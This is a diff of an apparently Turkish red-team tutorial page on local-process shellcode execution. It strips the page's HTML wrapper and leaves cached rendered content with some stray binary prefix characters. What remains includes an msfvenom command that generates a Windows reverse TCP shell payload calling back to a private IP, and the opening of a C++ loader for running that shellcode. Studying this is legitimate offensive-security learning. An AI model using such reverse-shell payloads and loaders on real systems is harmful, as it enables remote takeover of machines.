@@ -1,17 +1,4 @@
-<!DOCTYPE html>
-<html lang="en"><head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>Local Process Shellcode Execution</title><link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
-<body>
-    <div class="container"><header>
-  <div class="menu">
-    <ul><li><a href="/">Index of /</a></li><li><a href="/about.html">| Biz Kimiz</a></li><li><a href="/writeup.html">| Writeup</a></li><li><a href="/red.html">| Red Team</a></li><li><a href="/blue.html">| Blue Team</a></li></ul>
-  </div>
-</header>
-<main>
-      <hr />
+I"�<hr />
 <div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.1.106 <span class="nv">LPORT</span><span class="o">=</span>1234 <span class="nt">-f</span> c <span class="nt">-b</span> <span class="se">\x</span>00<span class="se">\x</span>0a<span class="se">\x</span>0d
 </code></pre></div></div>
 <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
@@ -71,11 +58,4 @@ C:<span class="se">\U</span>sers<span class="se">\a</span>sd<span class="se">\D<
 
 <h1 id="author-sectiontext">Author <a href=" https://twitter.com/SectionText">SectionText</a></h1>
 <hr />
-
-
-    </main><footer>
-  Bize Yazın <a href="mailto://7r157@protonmail.com">Mail</a>
-</footer>
-</div>
-  </body>
-</html>
+:ET
